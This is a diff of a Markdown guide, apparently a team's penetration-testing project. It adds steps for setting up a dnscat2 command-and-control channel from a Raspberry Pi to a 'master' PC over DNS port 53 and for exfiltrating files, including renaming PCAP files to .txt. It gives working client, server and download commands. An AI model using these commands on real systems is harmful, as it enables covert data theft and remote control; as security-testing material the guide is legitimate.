@@ -133,12 +133,33 @@ $ git clone https://github.com/iagox86/dnscat2.git
 $ cd dnscat2/client/
 
 $ make
-
 ```
 ## Setting up port forwarding  
 In order for the traffic to reach the Master PC, we have to configure the router, a.k.a the C&C Server to forward packets to the master computer. Log into your router and navigate to port forwarding and ensure it is turned on. Since DNS operates on port 53, we will configure the router to listen for traffic coming from port 53. You may choose to specify a different port if you want to reduce traffic overhead. Next, specify the IP address of your master and ensure that it is a static ip address. Monitor for both UDP and TCP and save changes. 
 
 ## Establishing a connection with dnscat2
+### Step 1
+To begin, start up the dnscat2 server first on the master by running the command (sudo ruby ./dnscat2.rb)
+### Step 2
+On the master, google ‘what is my ip’ and take note of the public IP address displayed. This will be crucial in the next step.
+
+### Step 3
+On the raspberry pi, type the command  
+
+`sudo ./dnscat --dns=server=your.public.ip.address,port=53`  
+Remeber your ip address from the previous step? Apply it onto this command. After this, the connection should be established. type `help` to see the commands available  
+
+## Exfiltrating Data  
+Dnscat2 has many features such as opening a shell, tunneling, as well as uploading files. In the context of command and control, we will be focusing on their download feature. This feature will be crucial in exfiltrating files. Users can perform exfiltration in 2 simple steps
+
+### Step 1  
+Establish a connection between the Pi and the Master. Proceed to create a blank txt file on the master (sudo touch /path/of/blank/file.txt)
+### Step 2
+On the master pc, type in the command  
+`download /path/of/data/you/want/to/exfiltrate.txt /path/of/blank/file.txt`  
+Where the first directory belongs to the pi and the second directory belongs to the master pc.
+#### TAKE NOTE!
+When exfiltrating any other files like PCAP files, change the extension to txt file before exfiltrating. After the file is in your master pc, change it back to its original format (.pcap, .png, .xlsx)
 
 # Wireless security  
 An area of attack that the team decides to attack is targeting devices that use wireless connection. By using Raspberry PI and a Wifi adapter, we will be able to scan and discover potential networks and exploit these networks using the right tool. This section will cover tools that will be used to bypass wireless defenses and perform penetration testing.
